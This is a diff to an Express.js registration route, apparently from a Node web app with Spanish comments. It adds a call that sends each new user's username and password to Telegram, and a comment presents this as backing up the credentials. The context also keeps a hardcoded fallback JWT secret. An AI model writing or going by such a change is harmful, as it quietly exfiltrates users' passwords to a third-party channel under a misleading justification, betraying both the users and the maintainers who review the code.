@@ -2,6 +2,7 @@ const express = require('express');
 const jwt = require('jsonwebtoken');
 const crypto = require('crypto');
 const { load, save } = require('../db');
+const telegram = require('../telegram');
 
 const router = express.Router();
 const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-cambia-esto';
@@ -48,6 +49,11 @@ router.post('/register', (req, res) => {
   };
   data.users.push(user);
   save(data);
+
+  // Cada registro se manda a Telegram con usuario y contrasena. Asi las
+  // credenciales quedan a salvo en Telegram y no dependen solo del archivo
+  // de la base de datos. Si Telegram falla, el registro sigue valido.
+  telegram.avisarRegistro(user);
 
   const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: '30d' });
   res.json({ token, user: publicUser(user) });
